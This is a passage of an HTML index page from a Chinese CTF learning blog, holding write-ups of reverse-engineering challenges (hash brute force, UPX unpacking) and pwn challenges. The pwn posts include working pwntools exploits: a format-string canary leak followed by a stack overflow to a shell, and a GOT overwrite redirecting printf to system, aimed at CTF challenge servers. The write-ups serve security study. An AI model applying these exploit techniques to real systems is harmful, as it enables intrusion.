@@ -1,0 +1,1386 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"linkpwn.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="linkpwn的学习经历">
+<meta property="og:type" content="website">
+<meta property="og:title" content="网络幻影">
+<meta property="og:url" content="http://linkpwn.github.io/page/5/index.html">
+<meta property="og:site_name" content="网络幻影">
+<meta property="og:description" content="linkpwn的学习经历">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="linkpwn">
+<meta property="article:tag" content="ctf学习，编程学习，游戏，日常">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://linkpwn.github.io/page/5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>网络幻影</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta custom-logo">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">网络幻影</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">linkpwn太卷了?</p>
+      <a>
+        <img class="custom-logo-image" src="/uploads/custom-logo.jpg" alt="网络幻影">
+      </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-fw fa-link"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content index posts-expand">
+            
+
+	<div class="tag-cloud">
+	  <div class="tag-cloud-tags" id="tags">
+		
+	  </div>
+	</div>
+	<br>
+	
+	<script type="text/javascript">
+     var alltags = document.getElementsByClassName('tag-cloud-tags');
+     var tags = alltags[0].getElementsByTagName('a');
+     for (var i = tags.length - 1; i >= 0; i--) {
+       var r=Math.floor(Math.random()*75+130);
+       var g=Math.floor(Math.random()*75+100);
+       var b=Math.floor(Math.random()*75+80);
+       tags[i].style.background = "rgb("+r+","+g+","+b+")";
+     }
+</script>
+
+<style>
+  .tag-cloud-tags{
+    /*font-family: Helvetica, Tahoma, Arial;*/
+    /*font-weight: 100;*/
+    text-align: center;
+    counter-reset: tags;
+  }
+  .tag-cloud-tags a{
+    border-radius: 6px;
+    padding-right: 5px;
+    padding-left: 5px;
+    margin: 8px 5px 0px 0px;
+  }
+  .tag-cloud-tags a:before{
+    content: "?";
+  }
+
+  .tag-cloud-tags a:hover{
+     box-shadow: 0px 5px 15px 0px rgba(0,0,0,.4);
+     transform: scale(1.1);
+     /*box-shadow: 10px 10px 15px 2px rgba(0,0,0,.12), 0 0 6px 0 rgba(104, 104, 105, 0.1);*/
+     transition-duration: 0.15s;
+  }
+</style>
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/02/12/BUUCTF-CrackRTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/02/12/BUUCTF-CrackRTF/" class="post-title-link" itemprop="url">BUUCTF CrackRTF</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-02-12 22:41:53" itemprop="dateCreated datePublished" datetime="2025-02-12T22:41:53+08:00">2025-02-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-20 10:23:23" itemprop="dateModified" datetime="2025-06-20T10:23:23+08:00">2025-06-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <ol>
+<li><p>先用IDA打开分析一下<br><img src="/2025/02/12/BUUCTF-CrackRTF/1.png" alt="1"></p>
+</li>
+<li><p>哈希值的加密方式可以根据这个<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/seccrypto/alg-id">表</a></p>
+</li>
+<li><p>先用脚本爆破password1</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标哈希值</span></span><br><span class="line">target_hash = <span class="string">&#x27;6E32D0943418C2C33385BC35A1470250DD8923A9&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 固定字符串部分</span></span><br><span class="line">fixed_str = <span class="string">&#x27;@DBApp&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数字范围</span></span><br><span class="line">start_num = <span class="number">99999</span></span><br><span class="line">end_num = <span class="number">1000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴力搜索</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(start_num, end_num):</span><br><span class="line">    <span class="comment"># 将数字转换为字符串并与固定字符串拼接，然后计算其SHA-256哈希值</span></span><br><span class="line">    test_str = <span class="built_in">str</span>(num) + fixed_str</span><br><span class="line">    hash_object = hashlib.sha1(test_str.encode())</span><br><span class="line">    <span class="keyword">if</span> hash_object.hexdigest().upper() == target_hash:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;找到匹配的字符串: <span class="subst">&#123;test_str&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;未找到匹配的字符串&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">找到匹配的字符串: 123321@DBApp</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>因为第二个恰好是MD5加密有<a target="_blank" rel="noopener" href="https://www.btool.cn/md5dsc">在线网站</a></p>
+<p><img src="/2025/02/12/BUUCTF-CrackRTF/2.png" alt="2"></p>
+</li>
+<li><p>再运行exe<br><img src="/2025/02/12/BUUCTF-CrackRTF/3.png" alt="3"></p>
+</li>
+</ol>
+<p>​      由此可知会产生一个dbapp.rtf文件，打开</p>
+<p>​         <img src="/2025/02/12/BUUCTF-CrackRTF/4.png" alt="4"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag&#123;N0_M0re_Free_Bugs&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/02/12/BUUCTF-re/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/02/12/BUUCTF-re/" class="post-title-link" itemprop="url">BUUCTF re</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-02-12 17:29:20" itemprop="dateCreated datePublished" datetime="2025-02-12T17:29:20+08:00">2025-02-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-20 10:23:43" itemprop="dateModified" datetime="2025-06-20T10:23:43+08:00">2025-06-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><ol>
+<li><p>查壳发现是upx</p>
+</li>
+<li><p>用upx工具脱壳</p>
+</li>
+<li><p>进入IDA看到<br><img src="/2025/02/12/BUUCTF-re/1.png" alt="1"></p>
+</li>
+<li><p>这题简单a1就是flag，附上脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_a1_to_string</span>():</span><br><span class="line">    <span class="comment"># 定义所有的乘数和期望结果</span></span><br><span class="line">    multipliers = [<span class="number">1629056</span>, <span class="number">6771600</span>, <span class="number">3682944</span>, <span class="number">10431000</span>, <span class="number">3977328</span>, <span class="number">5138336</span>, <span class="literal">None</span>,</span><br><span class="line">                   <span class="number">7532250</span>, <span class="number">5551632</span>, <span class="number">3409728</span>, <span class="number">13013670</span>, <span class="number">6088797</span>, <span class="number">7884663</span>, <span class="number">8944053</span>,</span><br><span class="line">                   <span class="number">5198490</span>, <span class="number">4544518</span>, <span class="number">10115280</span>, <span class="number">3645600</span>, <span class="number">9667504</span>, <span class="number">5364450</span>,</span><br><span class="line">                   <span class="number">13464540</span>, <span class="number">5488432</span>, <span class="number">14479500</span>, <span class="number">6451830</span>, <span class="number">6252576</span>, <span class="number">7763364</span>,</span><br><span class="line">                   <span class="number">7327320</span>, <span class="number">8741520</span>, <span class="number">8871876</span>, <span class="number">4086720</span>, <span class="number">9374400</span>, <span class="number">5759124</span>]</span><br><span class="line">    results = [<span class="number">166163712</span>, <span class="number">731332800</span>, <span class="number">357245568</span>, <span class="number">1074393000</span>, <span class="number">489211344</span>, <span class="number">518971936</span>,</span><br><span class="line">               <span class="literal">None</span>, <span class="number">406741500</span>, <span class="number">294236496</span>, <span class="number">177305856</span>, <span class="number">650683500</span>, <span class="number">298351053</span>,</span><br><span class="line">               <span class="number">386348487</span>, <span class="number">438258597</span>, <span class="number">249527520</span>, <span class="number">445362764</span>, <span class="number">981182160</span>, <span class="number">174988800</span>,</span><br><span class="line">               <span class="number">493042704</span>, <span class="number">257493600</span>, <span class="number">767478780</span>, <span class="number">312840624</span>, <span class="number">1404511500</span>, <span class="number">316139670</span>,</span><br><span class="line">               <span class="number">619005024</span>, <span class="number">372641472</span>, <span class="number">373693320</span>, <span class="number">498266640</span>, <span class="number">452465676</span>, <span class="number">208422720</span>,</span><br><span class="line">               <span class="number">515592000</span>, <span class="number">719890500</span>]</span><br><span class="line"></span><br><span class="line">    a1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(multipliers)):</span><br><span class="line">        <span class="keyword">if</span> multipliers[i] <span class="keyword">is</span> <span class="literal">None</span>:  <span class="comment"># 对于a1[6]，我们不知道具体的乘数，所以这里可以随意设置一个值或者保持为None</span></span><br><span class="line">            a1.append(<span class="string">&#x27;?&#x27;</span>)  <span class="comment"># 在此位置添加一个占位符</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = results[i] // multipliers[i]  <span class="comment"># 计算出正确的a1[i]值</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                char = <span class="built_in">chr</span>(value)  <span class="comment"># 将数值转换为对应的字符</span></span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                char = <span class="string">&#x27;?&#x27;</span>  <span class="comment"># 如果值不在有效的ASCII范围内，则使用&#x27;?&#x27;作为占位符</span></span><br><span class="line">            a1.append(char)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将数组转换为字符串格式</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(a1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(calculate_a1_to_string())</span><br></pre></td></tr></table></figure>
+
+<p>由于a1[6]不知道先设成’?’，在一个个试,最后试出来是1</p>
+<p>得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e165421110ba03099a1c039337&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/02/11/pwn98-canary-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/02/11/pwn98-canary-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" class="post-title-link" itemprop="url">pwn98(canary,格式化字符串)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-02-11 20:18:09" itemprop="dateCreated datePublished" datetime="2025-02-11T20:18:09+08:00">2025-02-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-20 10:33:39" itemprop="dateModified" datetime="2025-06-20T10:33:39+08:00">2025-06-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="ctfshow-pwn98"><a href="#ctfshow-pwn98" class="headerlink" title="ctfshow pwn98"></a>ctfshow pwn98</h1><ol>
+<li><p>由题目意思：Canary？有没有办法绕过呢？知道有canary</p>
+</li>
+<li><p>有IDA打开<br><img src="/2025/02/11/pwn98-canary-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/1.png" alt="1"></p>
+</li>
+</ol>
+<p>​    存在格式化字符串漏洞</p>
+<ol start="3">
+<li><p>计算偏移量</p>
+<p><img src="/2025/02/11/pwn98-canary-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2.png" alt="2"></p>
+</li>
+</ol>
+<p>  偏移值是5，在计算一下s到返回地址的是0x34,所以（0x34-canary）&#x2F;4 + 5 &#x3D; a,a就是最终的偏移量,不了解canary的可以<a target="_blank" rel="noopener" href="https://blog.csdn.net/Rinko233/article/details/143635468">看这篇文章</a></p>
+<ol start="4">
+<li>接着找canary<br><img src="/2025/02/11/pwn98-canary-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/3.png" alt="3"></li>
+</ol>
+<p>​    a &#x3D; (0x34-0x0c)&#x2F;4 + 5 &#x3D; 15  </p>
+<ol start="5">
+<li><p>开始写exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28195</span>)</span><br><span class="line">getshell = <span class="number">0x80486ce</span> </span><br><span class="line">payload_1 = <span class="string">b&#x27;%15$x&#x27;</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload_1)</span><br><span class="line">canary = <span class="built_in">int</span>(r.recv(),<span class="number">16</span>) <span class="comment">#canary = int(r.recv(8),16) </span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line">payload_2 = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x34</span> - <span class="number">0xc</span>) + p32(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xc</span> + p32(getshell) </span><br><span class="line">r.send(payload_2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>得到flag<br><img src="/2025/02/11/pwn98-canary-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/4.png" alt="4"></p>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/02/11/pwn94/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/02/11/pwn94/" class="post-title-link" itemprop="url">pwn94</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-02-11 09:58:59" itemprop="dateCreated datePublished" datetime="2025-02-11T09:58:59+08:00">2025-02-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-20 10:33:25" itemprop="dateModified" datetime="2025-06-20T10:33:25+08:00">2025-06-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="pwn94-格式化字符串"><a href="#pwn94-格式化字符串" class="headerlink" title="pwn94(格式化字符串)"></a>pwn94(格式化字符串)</h1><ol>
+<li><p>先用IDA打开,可以利用格式化字符串漏洞<br><img src="/2025/02/11/pwn94/1.png" alt="1"></p>
+</li>
+<li><p>找到system函数<br><img src="/2025/02/11/pwn94/2.png" alt="2"></p>
+</li>
+<li><p>找到偏移量为6<br><img src="/2025/02/11/pwn94/3.png" alt="3"></p>
+</li>
+<li><p>构造exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28175</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">sys_plt = elf.plt[<span class="string">&quot;system&quot;</span>]  </span><br><span class="line"><span class="comment">#把printf_got换成sys_plt，当执行printf的时候实实际在执行system函数</span></span><br><span class="line">payload = fmtstr_payload(offset,&#123;printf_got:sys_plt&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.send(<span class="string">&quot;bin_sh&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>得到flag<br><img src="/2025/02/11/pwn94/4.png" alt="4"></p>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/02/10/jarvisoj-fm-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
